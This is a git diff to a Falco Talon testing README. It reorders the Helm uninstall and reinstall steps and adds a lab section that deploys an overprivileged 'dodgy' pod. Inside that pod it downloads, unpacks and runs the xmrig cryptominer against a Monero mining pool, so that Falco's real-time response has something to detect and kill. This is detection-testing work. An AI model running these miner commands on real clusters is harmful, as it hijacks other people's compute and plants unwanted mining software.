@@ -105,10 +105,6 @@ helm install falco-talon . -n falco
 ```
 kubectl get pods -n falco
 ```
-Talon can be removed at any time via:
-```
-helm uninstall falco-talon -n falco
-```
 
 <img width="1199" alt="Screenshot 2023-12-13 at 20 58 02" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/b26f6857-ad33-4fe4-8b7a-d904ccd2c2c1">
 
@@ -128,6 +124,16 @@ wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falc
 cat rules.yaml
 ```
 
+Talon can be removed at any time via:
+```
+helm uninstall falco-talon -n falco
+```
+
+Reload Talon to recognize the changed rules without any issues:
+```
+helm install falco-talon . -n falco
+```
+
 ## Check for killed process in realtime
 Run this command command in the second window:
 ```
@@ -136,4 +142,24 @@ kubectl get events -n default
 
 ## Kill stratum protocol in realtime
 
-
+Create a dodgy, overprivleged workload:
+```
+kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
+```
+```
+kubectl exec -it dodgy-pod -- bash
+```
+Download the miner from Github
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+Unzip xmrig package:
+```
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+```
+```
+cd xmrig-6.16.4
+```
+```
+./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
+```
